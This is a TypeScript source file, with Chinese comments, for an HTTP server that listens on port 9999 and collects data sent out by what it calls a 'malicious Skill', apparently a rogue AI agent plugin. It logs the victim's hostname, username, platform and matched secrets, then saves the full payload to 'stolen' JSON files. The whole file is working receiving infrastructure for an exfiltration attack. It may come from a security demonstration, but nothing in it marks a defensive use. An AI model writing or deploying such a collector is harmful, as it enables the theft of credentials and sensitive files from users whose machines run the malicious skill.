/**
 * Data Collection Server (接收端)
 * 
 * 用于接收恶意 Skill 外发的数据
 * 运行在目标服务器上监听 9999 端口
 */

import * as http from "http";
import * as fs from "fs";
import * as path from "path";

const PORT = 9999;
const LOG_DIR = "./collected-data";

// 确保日志目录存在
if (!fs.existsSync(LOG_DIR)) {
  fs.mkdirSync(LOG_DIR, { recursive: true });
}

// 创建 HTTP 服务器
const server = http.createServer((req, res) => {
  if (req.method === "POST" && req.url === "/api/collect") {
    let body = "";

    req.on("data", (chunk) => {
      body += chunk.toString();
    });

    req.on("end", () => {
      console.log("\n" + "=".repeat(60));
      console.log("📦 收到窃取数据");
      console.log("=".repeat(60));

      try {
        const data = JSON.parse(body);
        
        // 打印摘要
        console.log(`\n时间: ${data.timestamp}`);
        console.log(`主机: ${data.hostname}`);
        console.log(`用户: ${data.username}`);
        console.log(`平台: ${data.systemInfo.platform} (${data.systemInfo.arch})`);
        console.log(`\n发现敏感信息: ${data.findings.length} 处\n`);

        // 打印详细信息
        for (const f of data.findings) {
          console.log(`  [${f.type}] ${f.file}`);
          for (const m of f.matches) {
            // 屏蔽部分内容
            const masked = m.length > 20 
              ? m.substring(0, 10) + "..." + m.substring(m.length - 5)
              : m;
            console.log(`    - ${masked}`);
          }
        }

        // 保存到文件
        const filename = `stolen-${Date.now()}.json`;
        const filepath = path.join(LOG_DIR, filename);
        fs.writeFileSync(filepath, JSON.stringify(data, null, 2));
        console.log(`\n✅ 数据已保存: ${filepath}`);

        // 返回成功
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ status: "success", saved: filename }));
        
      } catch (error: any) {
        console.error("❌ 解析错误:", error.message);
        res.writeHead(400);
        res.end("Bad Request");
      }
    });
  } else if (req.method === "GET" && req.url === "/health") {
    res.writeHead(200);
    res.end("OK");
  } else {
    res.writeHead(404);
    res.end("Not Found");
  }
});

server.listen(PORT, () => {
  console.log("=".repeat(60));
  console.log("🎯 数据接收服务器已启动");
  console.log("=".repeat(60));
  console.log(`\n监听端口: ${PORT}`);
  console.log(`接收端点: http://0.0.0.0:${PORT}/api/collect`);
  console.log(`数据目录: ${LOG_DIR}/\n`);
  console.log("等待恶意 Skill 外发数据...\n");
  console.log("提示: 按 Ctrl+C 停止服务器");
  console.log("=".repeat(60));
});